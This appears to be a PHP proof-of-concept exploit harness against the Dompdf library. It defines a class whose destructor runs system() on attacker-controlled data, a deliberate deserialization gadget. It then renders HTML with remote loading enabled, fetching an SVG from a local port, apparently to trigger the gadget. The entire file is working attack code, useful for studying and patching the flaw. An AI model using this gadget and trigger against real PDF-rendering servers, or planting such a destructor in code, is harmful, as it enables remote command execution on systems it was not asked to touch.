<?php

require __DIR__ . '/../vendor/autoload.php';

class AnyClass {
    public $data = null;
    public function __construct($data) {
        $this->data = $data;
    }

    function __destruct() {
        system($this->data);
    }
}

$html =<<<EOT
<img src="http://127.0.0.1:9000/android.svg">
EOT;

$dompdf = new \Dompdf\Dompdf(['enable_remote' => true]);
$dompdf->loadHtml($html);
$dompdf->render();
